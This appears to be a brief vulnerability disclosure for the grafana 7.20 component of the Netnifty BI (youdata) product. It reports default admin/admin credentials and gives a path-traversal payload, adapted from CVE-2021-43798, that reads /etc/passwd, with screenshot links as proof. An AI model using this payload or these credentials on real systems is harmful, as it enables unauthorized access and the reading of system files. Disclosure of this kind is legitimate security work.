# youdata_Vulnerabilities
Two vulnerabilities exist in version 7.20 of the grafana component of the Netnifty BI product: file reading and default password.
## Default password

The default password is：admin/admin

Verification Screenshot

Login page
![image](https://user-images.githubusercontent.com/43473886/199382994-c1e01821-4379-43f4-949a-03beb471db75.png)
Prompted to change the password, here proves that the default password of grafana component is the above given: admin/admin.Click the skip button here to skip the default password change
![image](https://user-images.githubusercontent.com/43473886/199383049-0384871f-3e68-4d3b-963e-cda512803e7c.png)
Successful login
![image](https://user-images.githubusercontent.com/43473886/199383084-7b85a2ae-8732-418a-8a8d-847f5ce4db99.png)

## File Read

This is magically modified from the payload of grafana's file reading vulnerability (CVE-2021-43798).

payload

```
/monitor/public/plugins/text/#/../../../../../../../../../../etc/passwd
```

Verification Screenshot

![image](https://user-images.githubusercontent.com/43473886/199383142-b2546da7-2187-4fb6-88ee-e7f117e8857e.png)
